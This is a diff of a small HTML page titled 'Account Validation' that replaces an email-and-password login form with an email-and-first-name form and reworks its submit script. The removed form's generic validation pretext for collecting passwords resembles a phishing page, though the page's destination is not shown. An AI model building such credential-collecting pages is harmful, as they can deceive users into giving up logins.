@@ -73,34 +73,47 @@ span.psw {
 
 <h2>Account Validation</h2>
 
-<form id="contactForm">
-    <img src="img_avatar2.png" alt="Avatar" class="avatar">
-  </div>
-  <div class="container">
-    <label for="email"><b>Email/Phone Number</b></label>
-    <input type="text" placeholder="Email/Mobile number" name="email" required>
-    
-    <label for="password"><b>Password</b></label>
-    <input type="password" placeholder="Enter Password" name="password" required>
-        
-    <button type="submit" id= "submitbtn">Login</button>
-    <label>
-      <input type="checkbox" checked="checked" name="remember"> Remember me
-    </label>
-  </div>
-</form>
+ <form id="contactForm">
+
+    <label for="email">Email / Phone Number</label>
+    <input
+      type="text"
+      id="email"
+      name="email"
+      placeholder="Email / Mobile number"
+      required
+    >
+
+    <label for="firstname">Firstname</label>
+    <input
+      type="text"
+      id="firstname"
+      name="firstname"
+      placeholder="Firstname"
+      required
+    >
+
+    <button type="submit" id="submitBtn">
+      Submit
+    </button>
+
+    <p id="formStatus" aria-live="polite"></p>
+
+  </form>
+
+</div>
+
 <script>
-document.getElementById("contactForm")
-.addEventListener("submit", async function(e) {
+const form = document.getElementById("contactForm");
+const button = document.getElementById("submitBtn");
+const status = document.getElementById("formStatus");
 
+form.addEventListener("submit", async (e) => {
   e.preventDefault();
-
-  const form = this;
-  const button = document.getElementById("submitBtn");
-  const status = document.getElementById("formStatus");
 
   button.disabled = true;
   button.textContent = "Sending...";
+  status.textContent = "";
 
   const formData = Object.fromEntries(
     new FormData(form).entries()
@@ -121,17 +134,16 @@ document.getElementById("contactForm")
       throw new Error(result.message || "Submission failed");
     }
 
-    status.textContent = "Your message was sent successfully!";
+    status.textContent = "Submission successful!";
     form.reset();
 
   } catch (error) {
-    status.textContent = error.message || "Something went wrong.";
+    status.textContent = error.message;
 
   } finally {
     button.disabled = false;
-    button.textContent = "Send Message";
+    button.textContent = "Submit";
   }
-
 });
 </script>
 </body>
